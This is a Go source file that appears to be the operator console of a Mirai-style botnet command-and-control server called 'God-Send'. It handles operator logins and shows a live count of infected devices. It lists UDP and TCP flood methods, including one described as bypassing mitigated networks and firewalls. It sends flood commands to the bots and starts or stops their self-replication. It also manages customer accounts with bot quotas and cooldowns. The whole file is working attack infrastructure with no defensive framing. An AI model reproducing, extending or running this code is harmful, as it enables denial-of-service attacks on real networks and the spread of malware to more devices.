package main

import (
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"
)

type Admin struct {
	conn net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

	var attackStatus int = 0
    attackStatusPointer := &attackStatus
    this.conn.Write([]byte("\033[1;37m\033[2J\033[1H"))
	this.conn.Write([]byte(fmt.Sprintf("\033]0;https://t.me/GodSendRaw.\007")))
    this.conn.Write([]byte("Username\033[1;35m- \033[1;37m"))
  username, err := this.ReadLine(false)
  if err != nil {
    return
  }

  this.conn.SetDeadline(time.Now().Add(60 * time.Second))
  this.conn.Write([]byte("Password\033[1;35m- \033[1;37m"))
  password, err := this.ReadLine(true)
  if err != nil {
    return
  }
	this.conn.SetDeadline(time.Now().Add(120 * time.Second))

	var loggedIn bool
	var userInfo AccountInfo




	if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
		this.conn.Write([]byte("\033[2J\033[1H"))
		time.Sleep(1000 * time.Millisecond)
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}

	time.Sleep(1 * time.Millisecond)

	go func() {
		i := 0
		for {
			var BotCount int
			if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
				BotCount = userInfo.maxBots
			} else {
				BotCount = clientList.Count()
			}

			time.Sleep(time.Second)
			if userInfo.admin == 1 {
                if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; %d Angels - %d/∞ Total Attacks\007", BotCount, database.fetchAttacks()))); err != nil {
                    this.conn.Close()
                    break
                }
            }
            if userInfo.admin == 0 {
                if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; %d Angels - %d/∞ Total Attacks\007", BotCount, database.fetchAttacks()))); err != nil {
                    this.conn.Close()
                    break
                }
            }
			i++
			if i%60 == 0 {
				this.conn.SetDeadline(time.Now().Add(120 * time.Second))
			}
		}
	}()



	// banner
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\033[1;37m"))



	for {
		var botCatagory string
		var botCount int

		this.conn.Write([]byte("\033[1;36mGod\033[1;35m-\033[1;36mSend\033[1;36m\033[1;35m~# \033[1;37m"))
		cmd, err := this.ReadLine(false)
		
		if err != nil || cmd == "?" || cmd == "help" || cmd == "HELP" || cmd == "methods" {
			this.conn.Write([]byte("\033[1;37m\r\n"))
			this.conn.Write([]byte("\033[1;36mGod\033[1;35m-\033[1;36mSend\033[1;37m Available Attacks\033[1;35m:\033[1;37m \r\n"))
			this.conn.Write([]byte("\033[1;36m udpflood  \033[1;35m:\033[1;37m generic udp plain flood\r\n"))
			this.conn.Write([]byte("\033[1;36m udphex    \033[1;35m:\033[1;37m complex udp hex flood\r\n"))
			this.conn.Write([]byte("\033[1;36m udprand   \033[1;35m:\033[1;37m udp flood creates multiple sockets with random payload\r\n"))
			this.conn.Write([]byte("\033[1;36m udpwizard \033[1;35m:\033[1;37m advanced udp flood with random payloads\r\n"))
			this.conn.Write([]byte("\033[1;36m vseflood  \033[1;35m:\033[1;37m valve source engine query udp flood \r\n"))
			this.conn.Write([]byte("\033[1;36m synflood  \033[1;35m:\033[1;37m tcp syn flood, Flags (URG, ACK, PSH, RST, SYN, FIN)\r\n"))
			this.conn.Write([]byte("\033[1;36m ackflood  \033[1;35m:\033[1;37m tcp ackflood with random payload data\r\n"))
			this.conn.Write([]byte("\033[1;36m wraflood  \033[1;35m:\033[1;37m tcp wra flood\r\n"))
			this.conn.Write([]byte("\033[1;36m tcpstream \033[1;35m:\033[1;37m tcp packet stream flood\r\n"))
			this.conn.Write([]byte("\033[1;36m tcpsack   \033[1;35m:\033[1;37m tcpsack flood bypass mitigated networks/firewall\r\n"))
			this.conn.Write([]byte("\033[1;36m socket    \033[1;35m:\033[1;37m tcp handshake with socket\r\n"))
			this.conn.Write([]byte("\033[1;36m handshake \033[1;35m:\033[1;37m tcp syn+ack handshake flood \r\n"))
			this.conn.Write([]byte("\033[1;36m tcppsh    \033[1;35m:\033[1;37m tcp syn+psh handshake with various TCP flags\r\n\n"))
			this.conn.Write([]byte("\033[1;37mAvailable Method Flags\033[1;36m:\033[1;37m\r\n"))
			this.conn.Write([]byte("\033[1;35m  -   \033[1;36mhandshake \033[1;37m[\033[1;36mtarget\033[1;37m] [\033[1;36mtime\033[1;37m] [ '\033[1;36m?\033[1;37m' for options]\r\n"))
			this.conn.Write([]byte("\033[1;37m Ex \033[1;35m: \033[1;36mhandshake\033[1;37m 127.0.0.1 1200 \033[1;35m?\033[1;37m\r\n"))
			this.conn.Write([]byte("\033[1;37m\r\n"))
			continue
        }
        if err != nil || cmd == "clear" || cmd == "cls" || cmd == "c" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\033[1;37m"))
            continue
        }

		if err != nil || cmd == "LOGOUT" || cmd == "logout" || cmd == "EXIT" || cmd == "exit" {
			return
		}

		if userInfo.admin == 1 && cmd == "admin" {
			this.conn.Write([]byte("\033[1;36mstartrep      \033[1;35m- \033[1;37mStarts Selfrep on The bot.\r\n"))
			this.conn.Write([]byte("\033[1;36mstoprep      \033[1;35m- \033[1;37mStops Selfrep on The bot.\r\n"))
			this.conn.Write([]byte("\033[1;36mremoveuser      \033[1;35m- \033[1;37mRemove a User.\r\n"))
			this.conn.Write([]byte("\033[1;36maddbasic        \033[1;35m- \033[1;37mAdd a Basic Acount.\r\n"))
			this.conn.Write([]byte("\033[1;36maddadmin        \033[1;35m- \033[1;37mAdd a Admin Account.\r\n"))
			this.conn.Write([]byte("\033[1;36musers/members 	\033[1;35m- \033[1;37mShow All Network's Users.\r\n"))
			this.conn.Write([]byte("\033[1;36mblock/unblock 	\033[1;35m- \033[1;37mBlock/Unblock Attacks On A Ip Range.\r\n"))
			this.conn.Write([]byte("\033[1;36mfloods enable 	\033[1;35m- \033[1;37mEnable Attacks.\r\n"))
			this.conn.Write([]byte("\033[1;36mfloods disable 	\033[1;35m- \033[1;37mDisable Attacks.\r\n"))
			continue
		}

		if attackStatus < 1 && userInfo.admin > 0 && cmd == "floods enable" {
            this.conn.Write([]byte("\033[1;37mFloods Have Already Been Enabled\033[37;1m.\r\n"))
            continue
        }
        if attackStatus > 0 && userInfo.admin > 0 && cmd == "floods disable" {
            this.conn.Write([]byte("\033[1;37mFloods Have Already Been Disabled\033[37;1m.\r\n"))
            continue
        }
        if attackStatus < 1 && userInfo.admin > 0 && cmd == "floods disable" {
            this.conn.Write([]byte("\033[1;37mFloods Successfully Disabled\033[37;1m.\r\n"))
            *attackStatusPointer = 1
            continue
        }
        if attackStatus > 0 && userInfo.admin > 0 && cmd == "floods enable" {
            this.conn.Write([]byte("\033[1;37mFloods Successfully Enabled\033[37;1m.\r\n"))
            *attackStatusPointer = 0
            continue
        }
        if attackStatus > 0 && strings.Contains(cmd, "vseflood") || attackStatus > 0 && strings.Contains(cmd, "synflood") || attackStatus > 0 && strings.Contains(cmd, "ackflood") || attackStatus > 0 && strings.Contains(cmd, "udpflood") || attackStatus > 0 && strings.Contains(cmd, "udphex") || attackStatus > 0 && strings.Contains(cmd, "tcpsack") || attackStatus > 0 && strings.Contains(cmd, "udprand") || attackStatus > 0 && strings.Contains(cmd, "socket") || attackStatus > 0 && strings.Contains(cmd, "tcpstream") || attackStatus > 0 && strings.Contains(cmd, "handshake") || attackStatus > 0 && strings.Contains(cmd, "tcppsh"){
            this.conn.Write([]byte("\033[1;37mSelected Flood Has Been Disabled By The Admin\033[1;37m.\r\n"))
            continue
        }

		if userInfo.admin == 1 && cmd == "block" {
			this.conn.Write([]byte("\033[1;37mPut the IP (next prompt will be asking for prefix):\033[01;37m "))
			new_pr, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[1;37mPut the Netmask (after slash):\033[01;37m "))
			new_nm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[1;37mWe are going to block all attacks attempts to this ip range: \033[97m" + new_pr + "/" + new_nm + "\r\n\033[1;37mContinue? \033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.BlockRange(new_pr, new_nm) {
				this.conn.Write([]byte(fmt.Sprintf("\033[0;36m%s\033[1;37m\r\n", "An unknown error occured.")))
			} else {
				this.conn.Write([]byte("\033[32;1mSuccessful!\033[1;37m\r\n"))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "unblock" {
			this.conn.Write([]byte("\033[1;37mPut the prefix that you want to remove from whitelist: \033[01;37m"))
			rm_pr, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[1;37mPut the netmask that you want to remove from whitelist (after slash):\033[01;37m "))
			rm_nm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[1;37mWe are going to unblock all attacks attempts to this ip range: \033[97m" + rm_pr + "/" + rm_nm + "\r\n\033[1;37mContinue? \033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.UnBlockRange(rm_pr) {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;31mUnable to remove that ip range\r\n")))
			} else {
				this.conn.Write([]byte("\033[01;32mSuccessful!\r\n"))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "angels" || cmd == "bots" || cmd == "botcount" {
			botCount = clientList.Count()
			m := clientList.Distribution()
			for k, v := range m {
				this.conn.Write([]byte(fmt.Sprintf("%s\033[1;35m:\033[1;36m %d\033[1;37m\r\n", k, v)))
			}
			continue
		}

		if cmd == "" {
			continue
		}

		if cmd == "@" {
			continue
		}

		if len(cmd) > 100 {
            this.conn.Write([]byte("\033[1;37mCommand Exceeds The Max String Size.")) // dont want someone tryna spam more than 100 chars, it should be enough anyways
            fmt.Println("\033[1;37m " + username + " Just Attempted To Exceed The Max Command Size, Their Session Has Been Closed")
            time.Sleep(time.Duration(1000) * time.Millisecond)
            return
        }

		if userInfo.admin == 1 && cmd == strings.ToLower("addbasic") {
			this.conn.Write([]byte("\033[1;36mUsername\033[1;35m~ \033[1;37m"))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[1;36mPassword\033[1;35m~ \033[1;37m"))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[1;35m-1\033[1;37m for Full Attack Network\r\n"))
			this.conn.Write([]byte("\033[1;36mAllowed Bots\033[1;35m~ \033[1;37m"))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("\033[1;35m0 \033[1;37mfor INFINITE time. \r\n"))
			this.conn.Write([]byte("\033[1;36mAllowed Time\033[1;35m~ \033[1;37m"))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("\033[1;35m0\033[1;37m for no cooldown. \r\n"))
			this.conn.Write([]byte("\033[1;36mCooldown\033[1;35m~ \033[1;37m"))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("\033[1;36mUsername\033[1;35m~\033[1;37m " + new_un + "\r\n"))
			this.conn.Write([]byte("\033[1;36mPassword\033[1;35m~\033[1;37m " + new_pw + "\r\n"))
			this.conn.Write([]byte("\033[1;36mDuration\033[1;35m~\033[1;37m " + duration_str + "\r\n"))
			this.conn.Write([]byte("\033[1;36mCooldown\033[1;35m~\033[1;37m " + cooldown_str + "\r\n"))
			this.conn.Write([]byte("\033[1;36mNetwork\033[1;35m~\033[1;37m " + max_bots_str + "\r\n"))
			this.conn.Write([]byte(""))
			this.conn.Write([]byte("\033[1;36mConfirm \033[1;35m(\033[1;32my\033[1;35m/\033[1;31mn\033[1;35m):\033[1;37m "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.createUser(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte("\033[92mFailed to create User! \r\n"))
			} else {
				this.conn.Write([]byte("\033[92mUser created! \r\n"))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == strings.ToLower("addadmin") {
			this.conn.Write([]byte("\033[1;36mUsername\033[1;35m~ \033[1;37m"))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[1;36mPassword\033[1;35m~ \033[1;37m"))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[1;35m-1\033[1;37m for Full Attack Network\r\n"))
			this.conn.Write([]byte("\033[1;36mAllowed Bots\033[1;35m~ \033[1;37m"))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("\033[1;35m0 \033[1;37mfor INFINITE time. \r\n"))
			this.conn.Write([]byte("\033[1;36mAllowed Time\033[1;35m~ \033[1;37m"))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("\033[1;35m0\033[1;37m for no cooldown. \r\n"))
			this.conn.Write([]byte("\033[1;36mCooldown\033[1;35m~ \033[1;37m"))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("\033[1;36mUsername\033[1;35m~\033[1;37m " + new_un + "\r\n"))
			this.conn.Write([]byte("\033[1;36mPassword\033[1;35m~\033[1;37m " + new_pw + "\r\n"))
			this.conn.Write([]byte("\033[1;36mDuration\033[1;35m~\033[1;37m " + duration_str + "\r\n"))
			this.conn.Write([]byte("\033[1;36mCooldown\033[1;35m~\033[1;37m " + cooldown_str + "\r\n"))
			this.conn.Write([]byte("\033[1;36mNetwork\033[1;35m~\033[1;37m " + max_bots_str + "\r\n"))
			this.conn.Write([]byte(""))
			this.conn.Write([]byte("\033[1;36mConfirm \033[1;35m(\033[1;32my\033[1;35m/\033[1;31mn\033[1;35m):\033[1;37m "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.createAdmin(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte("\033[1;31mFailed to create User\033[1;35m!\033[1;37m \r\n"))
			} else {
				this.conn.Write([]byte("\033[1;32mUser created\033[1;35m!\033[1;37m \r\n"))
			}
			continue
		}
		if isAdmin(userInfo) && cmd == strings.ToLower("removeuser") {
			this.conn.Write([]byte("\033[1;36mUsername\033[1;35m~ \033[1;37m "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if !database.removeUser(new_un) {
				this.conn.Write([]byte("\033[1;31User doesn't exists.\r\n"))
			} else {
				this.conn.Write([]byte("\033[1;32mUser removed\r\n"))
			}
			continue
		}

		botCount = userInfo.maxBots
		atk, err := NewAttack(cmd, userInfo.admin)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("%s\r\n", err.Error())))
		} else {
			var AttackCount int
			if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
				AttackCount = userInfo.maxBots
			} else {
				AttackCount = clientList.Count()
			}
			if cmd == strings.ToLower("startrep") {
				if isAdmin(userInfo) {
					fmt.Println("" + username + " tried to start selfrep")
					this.conn.Write([]byte(fmt.Sprintf("\033[1;37mInitiating start SelfREP With \033[1;36m%d \033[1;37mConnected Devices\033[1;37m\r\n", AttackCount)))
					buf, err := atk.Build_Startrep()
					if err != nil {
						this.conn.Write([]byte(fmt.Sprintf("%s\r\n", err.Error())))
						continue
					}
					clientList.QueueBuf(buf, botCount, botCatagory)
					continue
				} else {
					fmt.Println("" + username + " tried to start selfrep and isnt admin")
					continue
				}
			}
			if cmd == strings.ToLower("stoprep") {
			    if isAdmin(userInfo) {
					fmt.Println("" + username + " tried to stop selfrep")
					this.conn.Write([]byte(fmt.Sprintf("\033[1;37mInitiating stop SelfREP With \033[1;36m%d \033[1;37mConnected Devices\033[1;37m\r\n", AttackCount)))
					buf, err := atk.Build_Stoprep()
					if err != nil {
						this.conn.Write([]byte(fmt.Sprintf("%s\r\n", err.Error())))
						continue
					}
					clientList.QueueBuf(buf, botCount, botCatagory)
					continue
				} else {
					fmt.Println("" + username + " tried to stop selfrep and isnt admin")
				}
			}
			buf, err := atk.Build()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\r\n", err.Error())))
			} else {
				if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
					this.conn.Write([]byte(fmt.Sprintf("%s\r\n", err.Error())))
				} else if !database.ContainsWhitelistedTargets(atk) {
					this.conn.Write([]byte(fmt.Sprintf("\033[1;37mInitiating Attack With \033[1;36m%d \033[1;37mConnected Devices\033[1;37m\r\n", AttackCount)))
					fmt.Println("\033[35m[ \033[1;36mGod-Send Attack Logging system \033[1;35m] >> \033[1;37mCommand sent by \033[1;35m[" + username + "\033[1;35m]\033[37m using command line.\033[1;37m\n")
					clientList.QueueBuf(buf, botCount, botCatagory)
				} else {
					this.conn.Write([]byte(fmt.Sprintf("\033[1;36mThis address is whitelisted by our botnet which means you can't attack none of ip's in this range.\033[0;31m\r\n")))
					fmt.Println("" + username + " tried to attack on one of whitelisted ip ranges")
				}

				
			}
		}
	}
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 500000)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos : bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos : bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\033' {
                buf[bufPos] = '^'
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++
                buf[bufPos] = '['
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}

func isAdmin(userInfo AccountInfo) bool {
	if userInfo.admin == 1 {
		return true
	}
	return false
}

func getRank(userInfo AccountInfo) string {
	if userInfo.admin == 1 {
		return "Admin"
	}
	return "User"
}